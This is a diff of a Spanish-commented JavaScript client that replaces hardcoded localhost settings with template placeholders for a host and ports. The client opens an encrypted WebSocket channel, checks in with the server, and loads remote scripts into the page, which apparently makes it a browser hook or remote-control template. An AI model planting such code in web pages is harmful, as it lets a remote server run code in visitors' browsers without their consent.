@@ -1,7 +1,3 @@
-const host = "localhost"
-const httpPort = "8000"
-const wsport = "8765"
-
 function sendMessage(msg) {
     mes = JSON.stringify(msg)
     webSocket.send(encrypt(mes));
@@ -10,7 +6,7 @@ function sendMessage(msg) {
 function loadScript(url) {
     // Si la URL no viene completa, se completa la URL para descargar el script del servidor
     if (!(/(http(s?)):\/\//i.test(url))) {
-        url = "http://" + host + ":" + httpPort + "/" + url
+        url = "http://$host:$hport/" + url
     }
     // Comprueba si el script existe, si existe devuelve true y carga una etiqueta script en el head del documento.
     return fetch(url).then(response => {
@@ -23,7 +19,7 @@ function loadScript(url) {
     })
 }
 
-const webSocket = new WebSocket("ws://" + host + ":" + wsport);
+const webSocket = new WebSocket("ws://$host:$wport");
 webSocket.onopen = (event) => {
     sendMessage({ type: 1 });
 };
